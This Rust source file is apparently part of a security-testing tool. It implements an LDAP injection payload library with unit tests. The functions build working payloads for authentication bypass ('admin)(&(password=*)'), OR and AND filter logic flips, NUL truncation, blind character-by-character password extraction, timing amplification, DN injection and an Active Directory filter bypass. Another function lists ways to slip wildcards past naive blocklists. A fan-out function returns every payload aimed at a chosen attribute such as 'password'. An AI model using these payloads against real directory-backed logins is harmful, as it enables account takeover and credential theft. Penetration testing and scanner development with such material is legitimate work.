//! LDAP injection comprehensive payload library.
//!
//! LDAP queries are S-expressions: `(&(uid=alice)(password=secret))`.
//! When user input lands unsanitized inside a filter:
//!
//! ```text
//! (&(uid={USER})(password={PASS}))
//! ```
//!
//! …the attacker can submit `USER = "admin)(&(password=*"` to flip
//! the logic to `(&(uid=admin)(&(password=*))(password={PASS}))`,
//! defeating the password check.
//!
//! Three injection contexts:
//!
//! 1. **Search-filter injection**: most common. Operator controls
//!    a substring of an `(attribute=value)` predicate inside a `(&...)`
//!    or `(|...)` chain.
//! 2. **DN injection**: operator controls part of the search-base
//!    DN. Can manipulate which subtree the search runs against.
//! 3. **Attribute-value injection in writes** (ldap_add / ldap_modify).
//!
//! Coverage:
//!
//! - **Wildcard match** (`*`): match anything.
//! - **OR injection** (`)(|(uid=*`): logic flip.
//! - **AND truncation** (`)(&(...)`): close current predicate +
//!   inject new one.
//! - **NUL truncation** (`%00`): on legacy LDAP clients, NUL byte
//!   ends the filter early.
//! - **Comment-style truncation** (`)(...)`): some LDAP servers
//!   ignore trailing garbage after the closing paren of the
//!   outermost filter.
//! - **Blind injection** — single-character boolean check via
//!   `(uid=admin)(&(password=a*))`: server returns differently
//!   depending on first char of password.
//! - **Timing injection**: `(uid=admin)(|(password=*)(password=a*)...)` —
//!   each | clause widens; the server-side cost scales.
//! - **Bypass for `(uid=*)` blocklists**: replace `*` with `*\00`,
//!   `**`, `(uid=*)(uid=*)`.
//! - **Active Directory specific**: `(&(objectClass=user)(...))` —
//!   inject after `objectClass`.

/// Wildcard-anything match. Used as a filter VALUE — the attacker
/// submits this and the resulting filter `(uid=*)` matches every
/// user.
#[must_use]
pub fn wildcard_match() -> &'static str {
    "*"
}

/// OR-injection payload. The attacker controls `{USER}` and submits
/// `*)(|(uid=*` so the filter `(&(uid={USER})(password=x))` becomes
/// `(&(uid=*)(|(uid=*))(password=x))` — every user matches.
#[must_use]
pub fn or_injection() -> &'static str {
    "*)(|(uid=*"
}

/// AND-truncation: close the current predicate, inject a new one
/// that's always true, and start a new no-op.
#[must_use]
pub fn and_truncation() -> &'static str {
    "*)(&(uid=*"
}

/// NUL-byte truncation. Legacy LDAP clients (and any C-string-based
/// binding) end the filter at the NUL.
#[must_use]
pub fn nul_truncation(injected: &str) -> String {
    format!("{injected}\u{0000}")
}

/// Comment-style truncation — inject a closing paren and trailing
/// garbage that confuses the parser but doesn't break the filter.
#[must_use]
pub fn comment_truncation() -> &'static str {
    ")(uid=*"
}

/// Auth-bypass injection — when the filter is
/// `(&(uid={user})(password={pass}))`, submit this as the username
/// to make the password check always pass.
#[must_use]
pub fn auth_bypass_username() -> &'static str {
    "admin)(&(password=*)"
}

/// Build a blind-injection probe: tests whether the first character
/// of the target attribute (`password` etc.) equals `ch`.
#[must_use]
pub fn blind_first_char_probe(target_attr: &str, ch: char) -> String {
    format!("admin)(&({target_attr}={ch}*))")
}

/// Build a binary-search blind probe — query attribute prefix
/// equals the operator-supplied known-prefix. Returns true/false
/// based on response status.
#[must_use]
pub fn blind_prefix_probe(target_attr: &str, known_prefix: &str) -> String {
    format!("admin)(&({target_attr}={known_prefix}*))")
}

/// Build a timing-amplification payload. The `|` chain has N
/// progressively widening clauses; the server walks each one.
#[must_use]
pub fn timing_amplification(n: usize) -> String {
    let mut clauses: Vec<String> = vec![];
    for i in 0..n {
        let prefix = "a".repeat(i + 1);
        clauses.push(format!("(uid={prefix}*)"));
    }
    format!("admin)(|{})", clauses.join(""))
}

/// Build a DN-injection payload. The attacker submits a search-base
/// component that escapes the legitimate DN.
#[must_use]
pub fn dn_injection(injected_dn: &str) -> String {
    format!("ou={injected_dn},dc=victim,dc=com")
}

/// Build an Active Directory specific payload — common AD filter
/// (`objectClass=user`) plus attacker injection that flips the match.
#[must_use]
pub fn ad_user_bypass() -> &'static str {
    "*)(objectClass=user"
}

/// Bypass `*` blocklist: variants that bypass naive `*` filtering.
#[must_use]
pub fn wildcard_blocklist_bypass() -> Vec<&'static str> {
    vec![
        // NUL-padded wildcard.
        "*\u{0000}",
        // Double wildcard.
        "**",
        // Wildcard then NUL then wildcard.
        "*\u{0000}*",
        // Multiple complete predicates.
        "*)(uid=*",
        // Encoded form (when client URL-decodes).
        "%2a",
    ]
}

/// One-shot fan-out: every LDAP injection shape for a given target
/// attribute (e.g. "password", "userPassword").
#[must_use]
pub fn all_ldap_attacks(target_attr: &str) -> Vec<(&'static str, String)> {
    let mut out = vec![
        ("wildcard", wildcard_match().to_string()),
        ("or-injection", or_injection().to_string()),
        ("and-truncation", and_truncation().to_string()),
        ("nul-truncation", nul_truncation("admin")),
        ("comment-truncation", comment_truncation().to_string()),
        ("auth-bypass-username", auth_bypass_username().to_string()),
        (
            "blind-first-char",
            blind_first_char_probe(target_attr, 'a'),
        ),
        (
            "blind-prefix",
            blind_prefix_probe(target_attr, "secre"),
        ),
        ("timing-10", timing_amplification(10)),
        (
            "dn-injection",
            dn_injection("AdminGroup"),
        ),
        ("ad-bypass", ad_user_bypass().to_string()),
    ];
    for (i, b) in wildcard_blocklist_bypass().into_iter().enumerate() {
        let name = match i {
            0 => "wildcard-nul",
            1 => "wildcard-double",
            2 => "wildcard-nul-mid",
            3 => "wildcard-multi-pred",
            _ => "wildcard-encoded",
        };
        out.push((name, b.to_string()));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wildcard_basic() {
        assert_eq!(wildcard_match(), "*");
    }

    #[test]
    fn or_injection_well_formed() {
        let p = or_injection();
        // Closes user predicate, opens OR, sets uid to wildcard.
        assert!(p.starts_with('*'));
        assert!(p.contains(")(|("));
        assert!(p.contains("uid=*"));
    }

    #[test]
    fn and_truncation_well_formed() {
        let p = and_truncation();
        assert!(p.starts_with('*'));
        assert!(p.contains(")(&("));
    }

    #[test]
    fn nul_truncation_appends_nul() {
        let p = nul_truncation("admin");
        assert!(p.ends_with('\u{0000}'));
        assert!(p.starts_with("admin"));
    }

    #[test]
    fn comment_truncation_basic() {
        let p = comment_truncation();
        assert_eq!(p, ")(uid=*");
    }

    #[test]
    fn auth_bypass_username_format() {
        let p = auth_bypass_username();
        assert!(p.starts_with("admin)(&("));
        assert!(p.contains("password=*"));
    }

    #[test]
    fn blind_first_char_probe_format() {
        let p = blind_first_char_probe("password", 'X');
        assert!(p.contains("password=X*"));
        assert!(p.starts_with("admin)(&("));
    }

    #[test]
    fn blind_prefix_probe_format() {
        let p = blind_prefix_probe("password", "secret");
        assert!(p.contains("password=secret*"));
    }

    #[test]
    fn timing_amplification_grows_with_n() {
        let p3 = timing_amplification(3);
        let p10 = timing_amplification(10);
        assert!(p10.len() > p3.len());
        assert!(p3.starts_with("admin)(|"));
        // Three clauses in p3.
        assert_eq!(p3.matches("(uid=").count(), 3);
        assert_eq!(p10.matches("(uid=").count(), 10);
    }

    #[test]
    fn timing_amplification_zero() {
        let p = timing_amplification(0);
        // Zero clauses still wraps with `(|)` form.
        assert_eq!(p, "admin)(|)");
    }

    #[test]
    fn dn_injection_appends_to_base() {
        let p = dn_injection("AdminGroup");
        assert!(p.starts_with("ou=AdminGroup,"));
        assert!(p.contains("dc=victim"));
    }

    #[test]
    fn ad_user_bypass_format() {
        let p = ad_user_bypass();
        assert!(p.starts_with('*'));
        assert!(p.contains("objectClass=user"));
    }

    #[test]
    fn wildcard_blocklist_bypass_count() {
        let v = wildcard_blocklist_bypass();
        assert!(v.len() >= 4);
    }

    #[test]
    fn wildcard_blocklist_includes_nul() {
        let v = wildcard_blocklist_bypass();
        assert!(v.iter().any(|s| s.contains('\u{0000}')));
    }

    #[test]
    fn wildcard_blocklist_includes_encoded() {
        let v = wildcard_blocklist_bypass();
        assert!(v.iter().any(|s| s.contains("%2a")));
    }

    #[test]
    fn all_ldap_attacks_minimum_count() {
        let v = all_ldap_attacks("password");
        assert!(v.len() >= 14);
    }

    #[test]
    fn all_ldap_unique_names() {
        let v = all_ldap_attacks("password");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_ldap_carry_target_attr() {
        let v = all_ldap_attacks("UNIQUE_ATTR_NAME");
        let any_carries = v.iter().any(|(_, p)| p.contains("UNIQUE_ATTR_NAME"));
        assert!(any_carries);
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_ldap_attacks("p");
        let b = all_ldap_attacks("p");
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_long_attr_no_panic() {
        let big = "a".repeat(10_000);
        let _ = blind_prefix_probe(&big, &big);
        let _ = timing_amplification(500);
        let _ = all_ldap_attacks(&big);
    }

    #[test]
    fn handles_unicode_attr_name() {
        let p = blind_first_char_probe("pärssword", 'X');
        assert!(p.contains("pärssword"));
    }

    #[test]
    fn unicode_blind_first_char() {
        let p = blind_first_char_probe("password", 'Ñ');
        assert!(p.contains("Ñ*"));
    }

    #[test]
    fn timing_amplification_each_clause_longer_than_previous() {
        let p = timing_amplification(5);
        // Walks `(uid=a*)`, `(uid=aa*)`, ... `(uid=aaaaa*)`
        for n in 1..=5 {
            let prefix = "a".repeat(n);
            assert!(p.contains(&format!("(uid={prefix}*)")));
        }
    }

    #[test]
    fn nul_truncation_preserves_prefix_bytes() {
        let p = nul_truncation("admin\x01\x02");
        // The function only adds NUL at the end — input bytes
        // pass through unchanged.
        assert!(p.starts_with("admin\x01\x02"));
        assert!(p.ends_with('\u{0000}'));
    }
}
